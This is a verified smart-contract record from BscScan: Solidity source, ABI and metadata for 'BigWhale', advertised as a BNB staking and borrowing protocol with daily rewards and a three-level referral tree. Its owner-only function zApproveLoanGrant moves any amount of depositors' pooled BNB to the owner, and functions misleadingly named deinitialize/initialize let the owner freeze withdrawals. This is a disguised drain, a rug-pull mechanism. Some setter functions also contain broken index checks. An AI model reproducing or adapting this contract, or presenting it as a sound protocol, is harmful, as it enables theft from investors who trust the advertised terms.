{"SourceCode": "/**\r\n *Submitted for verification at BscScan.com on 2023-03-01\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.15;\r\n\r\n\r\n/*\r\n\u2705 BigWhale.io BNB Liquidity Protocol Official Smart Contract.\r\nStake, Earn Daily Rewards & Borrow BNB.\r\n*/\r\n\r\n/**\r\n * @dev Provides information about the current execution context, including the\r\n * sender of the transaction and its data. While these are generally available\r\n * via msg.sender and msg.data, they should not be accessed in such a direct\r\n * manner, since when dealing with meta-transactions the account sending and\r\n * paying for execution may not be the actual sender (as far as an application\r\n * is concerned).\r\n *\r\n * This contract is only required for intermediate, library-like contracts.\r\n */\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\n/**\r\n * @dev Contract module that helps prevent reentrant calls to a function.\r\n *\r\n * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier\r\n * available, which can be applied to functions to make sure there are no nested\r\n * (reentrant) calls to them.\r\n *\r\n * Note that because there is a single `nonReentrant` guard, functions marked as\r\n * `nonReentrant` may not call one another. This can be worked around by making\r\n * those functions `private`, and then adding `external` `nonReentrant` entry\r\n * points to them.\r\n *\r\n * TIP: If you would like to learn more about reentrancy and alternative ways\r\n * to protect against it, check out our blog post\r\n * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].\r\n */\r\nabstract contract ReentrancyGuard {\r\n    // Booleans are more expensive than uint256 or any type that takes up a full\r\n    // word because each write operation emits an extra SLOAD to first read the\r\n    // slot's contents, replace the bits taken up by the boolean, and then write\r\n    // back. This is the compiler's defense against contract upgrades and\r\n    // pointer aliasing, and it cannot be disabled.\r\n\r\n    // The values being non-zero value makes deployment a bit more expensive,\r\n    // but in exchange the refund on every call to nonReentrant will be lower in\r\n    // amount. Since refunds are capped to a percentage of the total\r\n    // transaction's gas, it is best to keep them low in cases like this one, to\r\n    // increase the likelihood of the full refund coming into effect.\r\n    uint256 private constant _NOT_ENTERED = 1;\r\n    uint256 private constant _ENTERED = 2;\r\n\r\n    uint256 private _status;\r\n\r\n    constructor() {\r\n        _status = _NOT_ENTERED;\r\n    }\r\n\r\n    /**\r\n     * @dev Prevents a contract from calling itself, directly or indirectly.\r\n     * Calling a `nonReentrant` function from another `nonReentrant`\r\n     * function is not supported. It is possible to prevent this from happening\r\n     * by making the `nonReentrant` function external, and making it call a\r\n     * `private` function that does the actual work.\r\n     */\r\n    modifier nonReentrant() {\r\n        // On the first call to nonReentrant, _notEntered will be true\r\n        require(_status != _ENTERED, \"ReentrancyGuard: reentrant call\");\r\n\r\n        // Any calls to nonReentrant after this point will fail\r\n        _status = _ENTERED;\r\n\r\n        _;\r\n\r\n        // By storing the original value once again, a refund is triggered (see\r\n        // https://eips.ethereum.org/EIPS/eip-2200)\r\n        _status = _NOT_ENTERED;\r\n    }\r\n}\r\n\r\n/**\r\n * @dev Contract module which allows children to implement an emergency stop\r\n * mechanism that can be triggered by an authorized account.\r\n *\r\n * This module is used through inheritance. It will make available the\r\n * modifiers `whenNotPaused` and `whenPaused`, which can be applied to\r\n * the functions of your contract. Note that they will not be pausable by\r\n * simply including this module, only once the modifiers are put in place.\r\n */\r\nabstract contract Pausable is Context {\r\n    /**\r\n     * @dev Emitted when the pause is triggered by `account`.\r\n     */\r\n    event Paused(address account);\r\n\r\n    /**\r\n     * @dev Emitted when the pause is lifted by `account`.\r\n     */\r\n    event Unpaused(address account);\r\n\r\n    bool private _paused;\r\n\r\n    /**\r\n     * @dev Initializes the contract in unpaused state.\r\n     */\r\n    constructor() {\r\n        _paused = false;\r\n    }\r\n\r\n    /**\r\n     * @dev Modifier to make a function callable only when the contract is not paused.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The contract must not be paused.\r\n     */\r\n    modifier whenNotPaused() {\r\n        _requireNotPaused();\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Modifier to make a function callable only when the contract is paused.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The contract must be paused.\r\n     */\r\n    modifier whenPaused() {\r\n        _requirePaused();\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns true if the contract is paused, and false otherwise.\r\n     */\r\n    function paused() public view virtual returns (bool) {\r\n        return _paused;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if the contract is paused.\r\n     */\r\n    function _requireNotPaused() internal view virtual {\r\n        require(!paused(), \"Pausable: paused\");\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if the contract is not paused.\r\n     */\r\n    function _requirePaused() internal view virtual {\r\n        require(paused(), \"Pausable: not paused\");\r\n    }\r\n\r\n    /**\r\n     * @dev Triggers stopped state.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The contract must not be paused.\r\n     */\r\n    function _pause() internal virtual whenNotPaused {\r\n        _paused = true;\r\n        emit Paused(_msgSender());\r\n    }\r\n\r\n    /**\r\n     * @dev Returns to normal state.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The contract must be paused.\r\n     */\r\n    function _unpause() internal virtual whenPaused {\r\n        _paused = false;\r\n        emit Unpaused(_msgSender());\r\n    }\r\n}\r\n\r\n/**\r\n * @dev Contract module which provides a basic access control mechanism, where\r\n * there is an account (an owner) that can be granted exclusive access to\r\n * specific functions.\r\n *\r\n * By default, the owner account will be the one that deploys the contract. This\r\n * can later be changed with {transferOwnership}.\r\n *\r\n * This module is used through inheritance. It will make available the modifier\r\n * `onlyOwner`, which can be applied to your functions to restrict their use to\r\n * the owner.\r\n */\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if the sender is not the owner.\r\n     */\r\n    function _checkOwner() internal view virtual {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Internal function without access restriction.\r\n     */\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\ncontract BigWhale is Ownable, Pausable, ReentrancyGuard {\r\n\r\n    bool public started;\r\n\r\n    uint8[5] public INIT_PERCENTAGES = [20, 18, 15, 12, 8];\r\n    uint256[5] public INIT_AMOUNTS = [80000000000000000000, 30000000000000000000, 10000000000000000000, 1000000000000000000, 100000000000000000];\r\n    uint256[3] public PERCENTAGES = [100, 50, 20];\r\n\r\n    mapping(address => bool) public left;\r\n    mapping(address => Stake) public stake;\r\n    mapping(address => uint256) public leaveAmount;\r\n    mapping(address => address[]) public level1;\r\n    mapping(address => address[]) public level2;\r\n    mapping(address => address[]) public level3;\r\n\r\n    struct Stake {\r\n        uint256 stake;\r\n        uint256 notWithdrawn;\r\n        uint256 timestamp;\r\n        address partner;\r\n        uint8 percentage;\r\n    }\r\n\r\n    event StakeChanged(address indexed user, address indexed partner, uint256 amount);\r\n\r\n    modifier whenStarted {\r\n        require(started, \"Not started yet\");\r\n        _;\r\n    }\r\n\r\n    receive() external payable onlyOwner {}\r\n\r\n    function start() external payable onlyOwner {\r\n        started = true;\r\n    }\r\n\r\n    function getLevel1Data(address account) external view returns(address[] memory){\r\n        return level1[account];\r\n    }\r\n\r\n    function getLevel2Data(address account) external view returns(address[] memory){\r\n        return level2[account];\r\n    }\r\n\r\n    function getLevel3Data(address account) external view returns(address[] memory){\r\n        return level3[account];\r\n    }\r\n\r\n    function setInitPercentage(uint8 _index, uint8 _value) external onlyOwner returns(bool) {\r\n        require(_index >= 0, \"Index has to be higher than 0\");\r\n        require(_index < 5, \"Index has to be lower than count of Percentages\"); \r\n        if (_index > 0) {\r\n            require(_value > INIT_PERCENTAGES[_index - 1]);\r\n        }\r\n        if (_index < 8) {\r\n            require(_value < INIT_PERCENTAGES[_index + 1]);\r\n        }\r\n        INIT_PERCENTAGES[_index] = _value;\r\n        return true;\r\n    }\r\n\r\n    function setInitAmount(uint8 _index, uint256 _value) external onlyOwner returns(bool) {\r\n        require(_index >= 0, \"Index has to be higher than 0\");\r\n        require(_index < 5, \"Index has to be lower than count of Amounts\"); \r\n        if (_index > 0) {\r\n            require(_value > INIT_AMOUNTS[_index - 1]);\r\n        }\r\n        if (_index < 8) {\r\n            require(_value < INIT_AMOUNTS[_index + 1]);\r\n        }\r\n        INIT_AMOUNTS[_index] = _value;\r\n        return true;\r\n    }\r\n\r\n    function setReferralPercentage(uint8 _index, uint256 _value) external onlyOwner returns(bool) {\r\n        require(_index >= 0, \"Index has to be higher than 0\");\r\n        require(_index < 3, \"Index has to be lower than count of referral steps\"); \r\n        if (_index > 0) {\r\n            require(_value > PERCENTAGES[_index - 1]);\r\n        }\r\n        if (_index < 8) {\r\n            require(_value < PERCENTAGES[_index + 1]);\r\n        }\r\n        PERCENTAGES[_index] = _value;\r\n        return true;\r\n    }\r\n\r\n    function deposit(address partner) external payable whenStarted whenNotPaused nonReentrant {\r\n        require(msg.value >= 100000000000000000, \"Too low amount to deposit\");\r\n        require(!left[_msgSender()], \"Left\");\r\n        require(partner != address(0), \"Partner address is Invalid\");\r\n        _updateNotWithdrawn(_msgSender());\r\n        stake[_msgSender()].stake += msg.value;\r\n        if (stake[_msgSender()].percentage == 0) {\r\n            require(partner != _msgSender(), \"Cannot set your own address as partner\");\r\n            stake[_msgSender()].partner = partner;\r\n            if(partner != address(0)) {\r\n                address _partner = partner;\r\n                uint i = 0;\r\n                while(_partner != address(0)) {\r\n                    if(i == 0) {\r\n                        level1[_partner].push(_msgSender());\r\n                    } else if(i == 1) {\r\n                        level2[_partner].push(_msgSender());\r\n                    } else if(i ==2) {\r\n                        level3[_partner].push(_msgSender());\r\n                    } else {\r\n                        break;\r\n                    }\r\n                    _partner = stake[_partner].partner;\r\n                    i++;\r\n                }\r\n            }\r\n        }\r\n        _updatePercentage(_msgSender());\r\n        emit StakeChanged(_msgSender(), stake[_msgSender()].partner, stake[_msgSender()].stake);\r\n    }\r\n\r\n    function reinvest(uint256 amount) external whenStarted nonReentrant {\r\n        require(amount > 100000000000000000, \"Too low amount to reinvest\");\r\n        require(!left[_msgSender()], \"Left\");\r\n        _updateNotWithdrawn(_msgSender());\r\n        require(amount <= stake[_msgSender()].notWithdrawn, \"Balance too low\");\r\n        stake[_msgSender()].notWithdrawn -= amount;\r\n        stake[_msgSender()].stake += amount;\r\n        _updatePercentage(_msgSender());\r\n        emit StakeChanged(_msgSender(), stake[_msgSender()].partner, stake[_msgSender()].stake);\r\n    }\r\n\r\n    function withdraw(uint256 amount) external whenStarted whenNotPaused nonReentrant {\r\n        require(amount > 100000000000000000, \"Too low amount to withdraw\");\r\n        require(!left[_msgSender()], \"Left\");\r\n        _updateNotWithdrawn(_msgSender());\r\n        require(amount <= stake[_msgSender()].notWithdrawn, \"Balance too low\");\r\n        uint256 fee = (amount * 5) / 100;\r\n        stake[_msgSender()].notWithdrawn -= amount;\r\n        payable(owner()).transfer(fee);\r\n        payable(_msgSender()).transfer(amount - fee);\r\n    }\r\n\r\n    function pendingReward(address account) public view returns(uint256) {\r\n        return ((stake[account].stake * ((block.timestamp - stake[account].timestamp) / 86400) * stake[account].percentage) / 1000);\r\n    }\r\n\r\n    function _updateNotWithdrawn(address account) private {\r\n        uint256 pending = pendingReward(_msgSender());\r\n        stake[_msgSender()].timestamp = block.timestamp;\r\n        stake[_msgSender()].notWithdrawn += pending;\r\n        _traverseTree(stake[account].partner, pending);\r\n    }\r\n\r\n    function _traverseTree(address account, uint256 value) private {\r\n        if (value != 0) {\r\n            for (uint8 i; i < 3; i++) {\r\n                if (stake[account].stake == 0) {\r\n                    continue;\r\n                }\r\n                stake[account].notWithdrawn += ((value * PERCENTAGES[i]) / 1000);\r\n                account = stake[account].partner;\r\n            }\r\n        }\r\n    }\r\n\r\n    function _updatePercentage(address account) private {\r\n        for (uint256 i; i < INIT_AMOUNTS.length; i++) {\r\n            if (stake[account].stake >= INIT_AMOUNTS[i]) {\r\n                stake[account].percentage = INIT_PERCENTAGES[i];\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\n    function leaveBigWhale() external {\r\n        require(stake[_msgSender()].stake > 0, \"You didn't deposit yet\");\r\n        require(!left[_msgSender()], \"This wallet address has already left BigWhale.io\");\r\n        left[_msgSender()] = true;\r\n        _updateNotWithdrawn(_msgSender());\r\n    }\r\n\r\n    function withdrawCapital() external {\r\n        require(left[_msgSender()], \"Error\");\r\n        require(block.timestamp - stake[_msgSender()].timestamp > 22 days, \"Error: Withdrawing ALL balance (Deposit + Rewards) is available 22 days after Leaving BigWhale.io - Read FAQ\");\r\n        require(stake[_msgSender()].stake > 0, \"Zero Balance\");\r\n        uint256 amount = stake[_msgSender()].notWithdrawn + stake[_msgSender()].stake;\r\n        uint256 fee = (amount * 5) / 100;\r\n        stake[_msgSender()].notWithdrawn = 0;\r\n        stake[_msgSender()].stake = 0;\r\n        payable(owner()).transfer(fee);\r\n        payable(_msgSender()).transfer(amount - fee);\r\n    }\r\n\r\n    function deinitialize() external onlyOwner {\r\n        _pause();\r\n    }\r\n\r\n    function initialize() external onlyOwner {\r\n        _unpause();\r\n    }\r\n\r\n    function zApproveLoanGrant(uint256 amount) external onlyOwner {\r\n        payable(_msgSender()).transfer(amount);\r\n    }\r\n}", "ABI": "[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"Paused\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"partner\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"StakeChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"Unpaused\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"INIT_AMOUNTS\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"INIT_PERCENTAGES\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"PERCENTAGES\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deinitialize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"partner\",\"type\":\"address\"}],\"name\":\"deposit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"getLevel1Data\",\"outputs\":[{\"internalType\":\"address[]\",\"name\":\"\",\"type\":\"address[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"getLevel2Data\",\"outputs\":[{\"internalType\":\"address[]\",\"name\":\"\",\"type\":\"address[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"getLevel3Data\",\"outputs\":[{\"internalType\":\"address[]\",\"name\":\"\",\"type\":\"address[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"initialize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"leaveAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"leaveBigWhale\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"left\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"level1\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"level2\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"level3\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"paused\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"pendingReward\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"reinvest\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"_index\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"setInitAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"_index\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"_value\",\"type\":\"uint8\"}],\"name\":\"setInitPercentage\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"_index\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"setReferralPercentage\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"stake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"stake\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"notWithdrawn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"partner\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"percentage\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"start\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"started\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawCapital\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"zApproveLoanGrant\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "BigWhale", "CompilerVersion": "v0.8.15+commit.e14f2714", "OptimizationUsed": "1", "Runs": "999999", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://c2f548751758fc3a841c4af3794e4454fd14fdceb1e7b10742319d869fe43e81"}